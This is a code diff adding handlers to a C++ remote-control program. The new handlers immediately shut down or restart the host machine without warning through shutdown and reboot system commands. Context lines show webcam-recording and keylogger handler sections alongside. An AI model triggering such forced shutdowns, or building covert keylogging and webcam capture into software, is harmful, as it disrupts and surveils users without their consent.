@@ -134,6 +134,42 @@ json ProcessHandlers::stopWebcamRecord(const json &)
     return {{"type", "status"}, {"success", true}, {"message", "Webcam stop signal sent."}};
 }
 
+// === SYSTEM CONTROL HANDLERS ===
+
+json ProcessHandlers::systemShutdown(const json &)
+{
+    // Lệnh tắt máy ngay lập tức, không có cảnh báo
+#ifdef _WIN32
+    // Windows: shutdown /s /t 0
+    std::system("shutdown /s /t 0"); 
+#else
+    // Linux/macOS: shutdown now
+    std::system("shutdown now");
+#endif
+    return {
+        {"type", "status"},
+        {"success", true},
+        {"message", "System shutdown command sent."}
+    };
+}
+
+json ProcessHandlers::systemRestart(const json &)
+{
+    // Lệnh khởi động lại ngay lập tức, không có cảnh báo
+#ifdef _WIN32
+    // Windows: shutdown /r /t 0
+    std::system("shutdown /r /t 0");
+#else
+    // Linux/macOS: reboot
+    std::system("reboot");
+#endif
+    return {
+        {"type", "status"},
+        {"success", true},
+        {"message", "System restart command sent."}
+    };
+}
+
 // === KEYLOGGER HANDLERS ===
 json ProcessHandlers::startKeylog(const json &)
 {
